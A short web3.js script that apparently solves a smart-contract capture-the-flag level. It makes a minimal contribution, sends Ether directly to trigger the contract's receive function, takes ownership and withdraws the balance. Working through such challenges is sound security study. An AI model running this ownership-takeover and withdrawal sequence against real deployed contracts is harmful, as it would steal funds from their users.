// Create an instance of the contract
const contractInstance = new web3.eth.Contract(contract.abi, contract.address);
// Contribute to the contract
await contractInstance.methods
  .contribute()
  .send({ from: player, value: "999999999999999" });

// Send Ether directly so the fallback (receive) function is executed
await web3.eth.sendTransaction({ from: player, to: instance, value: "1" });
// Now, player is the owner

// Check that you are the owner
await contract.owner();

// Withdraw funds
await contractInstance.methods.withdraw().send({ from: player });
